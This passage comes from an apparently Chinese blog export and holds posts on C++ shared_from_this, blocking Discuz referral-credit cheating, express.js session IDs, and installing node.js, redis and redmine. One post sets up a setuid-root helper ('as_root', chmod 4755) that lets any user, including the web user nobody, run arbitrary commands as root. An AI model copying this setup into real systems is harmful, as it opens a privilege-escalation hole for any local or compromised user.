style=\"color: #6699cc;\">Chicken<\/span>&gt;\n{\n<span style=\"color: #99cc99;\">public<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f99157;\">Chicken<\/span>()\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">void<\/span> <span style=\"color: #f99157;\">use<\/span>()\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">shared_ptr<\/span>&lt;<span style=\"color: #6699cc;\">Chicken<\/span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr<\/span> = shared_from_this();\n<span style=\"background-color: #515151;\"> <\/span>   }\n};\n\n<span style=\"color: #6699cc;\">shared_ptr<\/span>&lt;<span style=\"color: #6699cc;\">Chicken<\/span>&gt; <span style=\"color: #f99157;\">chicken_ptr<\/span>(<span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Chicken<\/span>);\nchicken_ptr-&gt;use();\n<\/pre>\n<\/div>\n\n<p>\n\u7a81\u7136\u60f3\u8d77\u4e00\u6bb5\u5bf9\u8bdd\uff1a\n<\/p>\n<blockquote>\n<p>\n\u963f\u6f06\uff1a\u95fb\u897f\uff0c\u4e8b\u60c5\u8fdb\u884c\u7684\u600e\u4e48\u6837\u4e86\uff0c\u95fb\u897f\uff1f\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a \u6700\u8fd1\u6211\u53d1\u660e\u4e86\u4e9b\u4e1c\u897f\uff0c\u76f8\u4fe1\u80fd\u5e2e\u5f97\u5230\u4f60\u3002\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\u62ff\u51fa\u624b\u7535\u7b52\u3002\n<\/p>\n\n<p>\n\u963f\u6f06\uff1a\u624b\u7535\u7b52\uff1f\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a\u9519\uff0c\u8fd9\u652f\u4e0d\u662f\u4e00\u53ea\u666e\u901a\u7684\u624b\u7535\u7b52\uff0c\u8fd9\u652f\u662f\u4e00\u652f\u4e0d\u9700\u8981\u7535\u6c60\u7684\u592a\u9633\u80fd\u624b\u7535\u7b52\uff0c\u5728\u6709\u5149\u7684\u65f6\u5019\u4ed6\u5c31\u4f1a\u4eae\u3002\n<\/p>\n\n<p>\n\u53f8\u4ee4\uff1a\u90a3\u5982\u679c\u6ca1\u6709\u5149\u5462\uff1f\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a\u7edd\u5bf9\u4e0d\u4eae\u3002\n<\/p>\n\n<p>\n\u963f\u6f06\uff1a\u6709\u6ca1\u6709\u53ef\u80fd\u6ca1\u5149\u7684\u65f6\u5019\u5b83\u4e5f\u4f1a\u4eae\uff1f\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a\u95ee\u7684\u597d\uff0c\u5173\u706f\u3002\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a\u4f60\u62ff\u53e6\u4e00\u53ea\u624b\u7535\u7b52\u7167\u5b83\u5462\uff0c\u5b83\u5c31\u4f1a\u4eae\u3002\n<\/p>\n\n<p>\n\u8fbe\u95fb\u897f\uff1a\u54c8\u54c8\uff0c\u600e\u4e48\u6837\u554a\uff1f\n<\/p>\n\n<p>\n\u963f\u6f06\uff1a\u8fd9\u4e2a\u53d1\u660e\u8fd8\u771f\u6709\u521b\u610f\u554a\u3002\n<\/p>\n<\/blockquote>\n\n\n\n<p>\n\u53c2\u8003\uff1a\u300a<a href=\"http:\/\/hi.baidu.com\/cpuramdisk\/item\/7c2f8d77385e0f29d7a89cf0\">shared_from_this \u51e0\u4e2a\u503c\u5f97\u6ce8\u610f\u7684\u5730\u65b9<\/a>\u300b<\/p>\n"
},
{
  "title": "Discuz\u8bbf\u95ee\u63a8\u5e7f\u4efb\u52a1\u53cd\u4f5c\u5f0a",
  "timestamp": "2013-12-20 01:02:00",
  "tags": [
    "php",
    "discuz"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u8bc6\u522b\u4f5c\u5f0a\n\n<p>\n\u53d1\u8d34\u3001\u56de\u590d\u8f83\u5c11\u7684\u7528\u6237\u5177\u6709\u504f\u9ad8\u7684\u79ef\u5206\u3001\u7b49\u7ea7\u901a\u5e38\u5c31\u662f\u6f5c\u5728\u7684\u4f5c\u5f0a\u5bf9\u8c61\u3002\u5728\u540e\u53f0\u67e5\u770b\u8be5\u7528\u6237\u7684\u79ef\u5206\u5386\u53f2\uff0c\u5982\u679c\u6765\u5386\u4e0d\u660e\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u662f\u901a\u8fc7\u8bbf\u95ee\u63a8\u5e7f\u4f5c\u5f0a\u83b7\u5f97\u7684\u3002\n<\/p>\n\n<p>\n\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u91cc\u5c31\u53d1\u73b0\u6709\u4e00\u4e2a\u7528\u6237\u91d1\u94b1\u6570\u8fc7\u9ad8\uff0c\u5148\u67e5\u770b\u8be5\u7528\u6237\u7684\u79ef\u5206\u8868\uff1a\n<\/p>\n\n<pre class=\"example\">\nmysql&gt; SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;\n+-------+----------+-------------+\n| total | cyclenum | extcredits2 |\n+-------+----------+-------------+\n|  3454 |     3454 |           1 |\n+-------+----------+-------------+\n1 row in set (0.00 sec)\n<\/pre>\n\n<p>\n\u76f8\u5173\u5b57\u6bb5\u8bf4\u660e\n<\/p>\n<dl class=\"org-dl\">\n<dt> total <\/dt><dd>\u7b56\u7565\u88ab\u6267\u884c\u603b\u6b21\u6570\n<\/dd>\n<dt> cyclenum <\/dt><dd>\u5468\u671f\u88ab\u6267\u884c\u6b21\u6570 \n<\/dd>\n<dt> extcredits2 <\/dt><dd>\u6211\u4eec\u7684\u7cfb\u7edf\u91cc\u5bf9\u5e94\u91d1\u94b1\u6570\n<\/dd>\n<dt> rid <\/dt><dd>\u503c8\u4e3a\u8bbf\u95ee\u63a8\u5e7f\u4efb\u52a1\u7c7b\u578b\n<\/dd>\n<dt> uid <\/dt><dd>\u503c119\u4e3a\u4f5c\u5f0a\u7528\u6237id\n<\/dd>\n<\/dl>\n<p>\n\u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u51fa\u8be5\u7528\u6237\u5b8c\u6210\u4e863454\u6b21\u4efb\u52a1\uff0c \u63a5\u4e0b\u6765\u5c31\u9700\u8981\u786e\u8ba4\u8fd9\u4e9b\u4efb\u52a1\u662f\u901a\u8fc7\u4f5c\u5f0a\u5b8c\u6210\u7684\u4e86\u3002\n<\/p>\n\n<p>\n\u641c\u7d22\u8be5\u7528\u6237\u63a8\u5e7f\u94fe\u63a5\u5728web\u670d\u52a1\u5668\u4e2d\u7559\u4e0b\u7684\u8bbf\u95ee\u65e5\u5fd7\uff1a\n<\/p>\n<pre class=\"example\">\nlogs# grep 'fromuid=119' \/usr\/local\/nginx\/logs\/access.log*\n\"GET \/?fromuid=119.jpg HTTP\/1.1\" 301 6243 \"http:\/\/xxxx.org\/details.php?id=178668\"\n...\n<\/pre>\n\n<p>\n\u53ef\u4ee5\u521d\u6b65\u65ad\u5b9a\uff0c\u8be5\u7528\u6237\u901a\u8fc7\u5728\u5176\u5b83\u8bba\u575b\u4e2d\u53d1\u5e03\u4fe1\u606f\u5e76\u5c06\u63a8\u5e7furl\u6ce8\u5165\u5230\u56fe\u7247\u7684url\u4e2d\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u7ad9\u70b9\u5728\u8bbf\u95ee\u91cf\u6ca1\u6709\u4efb\u4f55\u589e\u957f\u7684\u60c5\u51b5\u4e0b\u8be5\u7528\u6237\u7684\u63a8\u5e7f\u6570\u5374\u77ac\u95f4\u5f6a\u5347\u4e86\u3002\n<\/p>\n<\/li>\n\n<li>\u963b\u6b62\u4f5c\u5f0a\n\n<p>\n\u901a\u8fc7\u4f7f\u7528\u5f15\u7528\u9875\u4e2d\u7684\u7528\u6237\u6807\u8bc6\u8fdb\u884c\u8bb0\u5f55\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u8fd9\u6837\u53ea\u6709\u5f53\u7528\u6237\u6765\u5230\u8bba\u575b\u5e76\u8fdb\u884c\u4e86\u76f8\u5173\u64cd\u4f5c\u624d\u7b97\u63a8\u8350\u6709\u6548\u3002\n<\/p>\n\n<p>\n\u4fee\u6539source\/class\/discuz\/discuz_application.php\u6587\u4ef6\uff0c\u5c06\u4e0b\u9762\u7684\u5185\u5bb9\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if<\/span>((!<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #6699cc;\">_GET<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>]) || !<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #6699cc;\">_GET<\/span>[<span style=\"color: #66cccc;\">'fromuser'<\/span>])) &amp;&amp; ($<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">var<\/span>[<span style=\"color: #66cccc;\">'setti<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ng'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_visit'<\/span><span style=\"text-decoration: underline;\">] || $<\/span><span style=\"color: #6699cc; text-decoration: underline;\">this<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">var<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_register'<\/span><span style=\"text-decoration: underline;\">])) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">require_once<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">libfile(<\/span><span style=\"color: #66cccc;\">'misc\/promotion'<\/span>, <span style=\"color: #66cccc;\">'include'<\/span>);\n}\n<\/pre>\n<\/div>\n<p>\n\u6539\u4e3a\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'<\/span>]) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">strpos(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'<\/span>], <span style=\"color: #66cccc;\">'http:\/\/<\/span><span style=\"color: #66cccc; text-decoration: underline;\">XXX.com\/'<\/span><span style=\"text-decoration: underline;\">) === <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">0<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">referer_query<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">parse_url(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'<\/span>], <span style=\"color: #f2777a; font-weight: bold;\">PHP_URL_QUERY<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">referer_query<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">parse_str(<\/span>$<span style=\"color: #ffcc66;\">referer_query<\/span>, $<span style=\"color: #ffcc66;\">referer_get<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>((!<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #ffcc66;\">referer_get<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>]) || !<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #ffcc66;\">referer_get<\/span>[<span style=\"color: #66cccc;\">'fromuser'<\/span>]))<span style=\"text-decoration: underline;\"> &amp;&amp; ($<\/span><span style=\"color: #6699cc; text-decoration: underline;\">this<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">var<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_visit'<\/span><span style=\"text-decoration: underline;\">] || $<\/span><span style=\"color: #6699cc; text-decoration: underline;\">this<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">var<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_register'<\/span><span style=\"text-decoration: underline;\">])) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">require_once<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">libfile(<\/span><span style=\"color: #66cccc;\">'misc\/promotion'<\/span>, <span style=\"color: #66cccc;\">'include'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<\/pre>\n<\/div>\n\n<p>\n\u4fee\u6539source\/include\/misc\/misc_promotion.php\u6587\u4ef6\uff0c\u5c06\u4e0b\u9762\u7684\u5185\u5bb9\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #6699cc;\">_GET<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>])) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuid<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">intval(<\/span>$<span style=\"color: #6699cc;\">_GET<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuser<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n} <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuser<\/span> = $<span style=\"color: #6699cc;\">_GET<\/span>[<span style=\"color: #66cccc;\">'fromuser'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuid<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n}\n<\/pre>\n<\/div>\n<p>\n\u6539\u4e3a\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #ffcc66;\">referer_get<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>])) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuid<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">intval(<\/span>$<span style=\"color: #ffcc66;\">referer_get<\/span>[<span style=\"color: #66cccc;\">'fromuid'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuser<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n} <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuser<\/span> = $<span style=\"color: #ffcc66;\">referer_get<\/span>[<span style=\"color: #66cccc;\">'fromuser'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fromuid<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n}\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "linux\u4e0b\u5141\u8bb8\u666e\u901a\u7528\u6237\u6267\u884c\u9700\u8981root\u6743\u9650\u7684\u547d\u4ee4",
  "timestamp": "2013-12-26 15:44:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n\u6700\u5178\u578b\u7684\u60c5\u51b5\u662f\u8981\u5b9e\u73b0\u4e00\u4e2a\u901a\u8fc7web\u754c\u9762\u91cd\u542f\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u901a\u5e38\u4e3a\u4e86\u5b89\u5168\u4f1a\u4ee5\u975eroot\u7528\u6237\u8eab\u4efd\uff08\u901a\u5e38\u662fnobody\uff09\u8fd0\u884c\u670d\u52a1\u7aef\u811a\u672c\uff0c\u8fd9\u6837\u811a\u672c\u4e2d\u5c31\u4e0d\u80fd\u6267\u884c\u5371\u9669\u64cd\u4f5c\u4e86\u3002\n<\/p>\n\n<p>\n\u4e0b\u9762\u7684c\u5de5\u5177\u7a0b\u5e8f\u53ef\u4ee5\u5141\u8bb8\u4efb\u610f\u7528\u6237\u6267\u884c\u9700\u8981root\u6743\u9650\u7684\u547d\u4ee4\uff1a\n<\/p>\n\n<p>\n[[<a href=\"..\/static\/as_root.c][as_root.c\">..\/static\/as_root.c][as_root.c<\/a>]\n<\/p>\n\n<p>\n\u7f16\u8bd1\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gcc -g as_root.c -o as_root\n<\/pre>\n<\/div>\n\n<p>\n\u914d\u7f6e\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">chown root:root .\/as_root; chmod 4755 .\/as_root\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo -u <span style=\"color: #66cccc;\">\"nobody\"<\/span> .\/as_root <span style=\"color: #66cccc;\">\"reboot\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"http:\/\/blog.tianya.cn\/blogger\/post_show.asp?BlogID=126326&PostID=1629441\">\u5982\u4f55\u5728\u666e\u901a\u7528\u6237\u4e0b\u6267\u884c\u4e00\u4e9b\u9700\u8981root\u7528\u6237\u6267\u884c\u7684\u547d\u4ee4<\/a><\/p>\n"
},
{
  "title": "express.js\u4e2d\u5982\u4f55\u5728\u7b2c\u4e00\u6b21\u8bf7\u6c42\u7684\u54cd\u5e94\u4e2d\u53d6\u5f97connect.sid",
  "timestamp": "2014-02-14 23:34:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u5728web\u9875\u9762\u901a\u8fc7iframe\u8de8\u57df\u767b\u5f55\u8bbf\u95ee\u670d\u52a1\u7684\u60c5\u51b5\u4e0b\uff0c\u662f\u4e0d\u65b9\u4fbf\u53d6cookie\u4e2d\u7684sessionid\u7684\uff0c\u4e8e\u662f\u60f3\u5230\u5c06sessionid\u76f4\u63a5\u653e\u5230\u54cd\u5e94\u4f53\u4e2d\uff0c\n\u8fd9\u5c31\u9700\u8981\u5728node.js\u4e2d\u76f4\u63a5\u83b7\u53d6connect.sid\u8fd9\u4e2acookie\u503c\uff0c\u4e00\u5f00\u59cb\u60f3\u5f53\u7136\u5730\u4ee5\u4e3a\u7cfb\u7edf\uff08\u4f7f\u7528\u7684\u662fpassport.js\uff09\u4f1a\u5728\u767b\u5f55\u8ba4\u8bc1\u901a\u8fc7\u540e\n\u6267\u884cres.cookie('connect.sid', &#x2026;)\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5c31\u60f3\u76f4\u63a5\u4eceres\u7684Set-Cookie\u5934\u89e3\u6790\u51fa\u8bbe\u7f6e\u7684\u503c\uff0c\u7ed3\u679c\u53d1\u73b0\u8fd9\u4e2acookie\u538b\u6839\u4e0d\u5b58\u5728\uff0c\n\u751a\u81f3\u5728\u5e93\u4ee3\u7801\u4e2d\u641c\u7d22cookie\u90fd\u4e0d\u7ba1\u7528\uff0c\u7740\u5b9e\u6025\u5f97\u4eba\u76f4\u6293\u5934\u3002\u6700\u540edump\u51fares\u540e\u786e\u5728req\u4e2d\u89c1\u5230\u4e86connect.sid\u503c\u7684\u5f71\u5b50\uff1areq.sessionID\uff0c\n\u7136\u540e\u5728 <a href=\"http:\/\/stackoverflow.com\/questions\/13693101\/express-sessionid-differs-from-sessionid-in-cookie\">\u300aExpress SessionID differs from SessionID in Cookie\u300b<\/a> \u4e2d\u627e\u5230\u4e86\u4ecereq.sessionID\u8ba1\u7b97\u51faconnect.sid\u7684\u65b9\u6cd5\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">signature<\/span> = require(<span style=\"color: #66cccc;\">'express\/node_modules\/cookie-signature'<\/span>);\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">connectSid<\/span> = <span style=\"color: #66cccc;\">'s:'<\/span> + signature.sign(req.sessionID, sessionOptions.secret);\n<\/pre>\n<\/div>\n\n<p>\n\u5176\u5b9e\uff0cconnect.sid\u8fd9\u4e2acookie\u662f\u5728\u8bf7\u6c42\u5230\u6765\u540e\u5728req\u4e0a\u8bbe\u7f6e\u7684\uff08\u4e0d\u5b58\u5728\u5219\u8bbe\u7f6e\uff09\uff0c\u4e0d\u7ba1\u6709\u6ca1\u6709\u767b\u5f55\u90fd\u4f1a\u8bbe\u7f6e\u3002<\/p>\n"
},
{
  "title": "\u7f16\u8bd1\u5b89\u88c5node.js",
  "timestamp": "2014-02-17 16:23:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u4e0b\u8f7d\n\n<p>\nnode.js\u662f\u4e00\u4e2a\u65b0\u5174\u7684\u5f00\u53d1\u5e73\u53f0\uff0c\u7248\u672c\u66f4\u65b0\u975e\u5e38\u6d3b\u8dc3\uff0c\u56e0\u6b64\u5e94\u8be5\u5c3d\u91cf\u4e0b\u8f7d\u5b89\u88c5\u6700\u65b0\u7684\u7248\u672c\u3002\n<\/p>\n\n<p>\n\u5230 <a href=\"http:\/\/nodejs.org\/\">http:\/\/nodejs.org\/<\/a> \u4e0b\u8f7d\u6700\u65b0\u7684\u7248\u672c\u3002\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5\n\n<p>\n\u89e3\u538b\u540e\u53c2\u7167 README.md \u8fdb\u884c\u5b89\u88c5\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/configure\nmake\nmake install\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b89\u88c5\u540e\n\n<p>\n\u9ed8\u8ba4\u5b89\u88c5\u5230\/usr\/local\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \/usr\/local\/bin\/node <\/dt><dd>node\u4e3b\u7a0b\u5e8f\n<\/dd>\n<dt> \/usr\/local\/bin\/npm <\/dt><dd>node\u6a21\u5757\u7ba1\u7406\u7a0b\u5e8f\n<\/dd>\n<dt> \/usr\/local\/lib\/node_modules <\/dt><dd>node\u5168\u5c40\u6a21\u5757\u76ee\u5f55\n<\/dd>\n<\/dl>\n<p>\n\u50cf\u4e00\u4e9b\u9700\u8981\u5168\u5c40\u5b89\u88c5\u7684\u6a21\u5757\u4e5f\u4f1a\u628a\u6587\u4ef6\u5b89\u88c5\u5728\/usr\/local\u76ee\u5f55\u4e0b\u3002\n<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u7f16\u8bd1\u5b89\u88c5redis",
  "timestamp": "2014-02-17 16:40:00",
  "tags": [
    "redis"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u4e0b\u8f7d\n\n<p>\n\u5230 <a href=\"http:\/\/redis.io\/download\">http:\/\/redis.io\/download<\/a> \u4e0b\u8f7d\u6700\u65b0\u7a33\u5b9a\u7248\u672c\u3002\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5\n\n<p>\n\u89e3\u538b\u540e\u53c2\u7167 README \u8fdb\u884c\u5b89\u88c5\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">make\nmake install\n<\/pre>\n<\/div>\n\n<p>\n\u9ed8\u8ba4\u5b89\u88c5\u5230\/usr\/local\u3002\n<\/p>\n\n<p>\n\u6307\u5b9a\u4f4d\u7f6e\u5b89\u88c5\uff1a \n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">make <span style=\"color: #ffcc66;\">PREFIX<\/span>=\/usr\/local\/redis install\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b89\u88c5\u540e\n\n<dl class=\"org-dl\">\n<dt> \/usr\/local\/bin\/redis-cli <\/dt><dd>redis\u5ba2\u6237\u7aef\u7a0b\u5e8f \n<\/dd>\n<dt> \/usr\/local\/bin\/redis-server <\/dt><dd>redis\u670d\u52a1\u5668\u7a0b\u5e8f\n<\/dd>\n<\/dl>\n<\/li>\n\n<li>\u914d\u7f6e\n\n<p>\n\u5c06\u6e90\u7801\u5305\u9644\u5e26\u7684\u914d\u7f6e\u6587\u4ef6 <code>redis.conf<\/code> \u62f7\u8d1d\u5230\u5b89\u88c5\u4f4d\u7f6e:\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir \/usr\/local\/redis\/etc\/\ncp .\/redis.conf \/usr\/local\/redis\/etc\/\n<\/pre>\n<\/div>\n\n<p>\n\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 <code>redis.conf<\/code> :\n<\/p>\n\n<pre class=\"example\">\ndaemonize yes\npidfile \/usr\/local\/redis\/var\/redis.pid\nlogfile \/usr\/local\/redis\/var\/redis.log\ndir \/usr\/local\/redis\/data\nstop-writes-on-bgsave-error no\nbind 127.0.0.1\n<\/pre>\n<\/li>\n\n<li>\u542f\u52a8\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">\/usr\/local\/redis\/bin\/redis-server \/usr\/local\/redis\/etc\/redis.conf\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u505c\u6b62\n\n<p>\n\u4f7f\u7528redis\u5ba2\u6237\u7aef\u4e2d\u6267\u884cshutdown\u547d\u4ee4\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-cli\nshutdown\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "CentOS 6.4\u4e0b\u5b89\u88c5redmine",
  "timestamp": "2014-03-07 14:17:00",
  "tags": [
    "linux",
    "redmine"
  ],
  "body": "<p>\n\u672c\u6587\u4e3aCentOS 6.4\u4e0b\u5b89\u88c5redmine-2.5.0\u7684\u7b14\u8bb0\uff0c\u6309\u7167 <a href=\"http:\/\/www.redmine.org\/projects\/redmine\/wiki\/RedmineInstall\">\u5b98\u65b9\u6587\u6863<\/a> \u8fdb\u884c\u5b89\u88c5\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5 <code>ruby<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install ruby\nyum install ruby-devel\nyum install rubygems\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5b89\u88c5 <code>redmine<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget <span style=\"color: #66cccc;\">'http:\/\/www.redmine.org\/releases\/redmine-2.5.0.tar.gz'<\/span>\ntar xzvf redmine-2.5.0.tar.gz\ngem install bundler\ngem install mysql2.\nyum install ImageMagick ImageMagick-devel\nbundle install --without development test\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u914d\u7f6e <code>redmine<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u4ee5 root \u7528\u6237\u767b\u5f55 <code>mysql<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mysql -uroot -p\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efa <code>redmine<\/code> \u7528\u6237\u53ca\u5e93\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sql\"><span 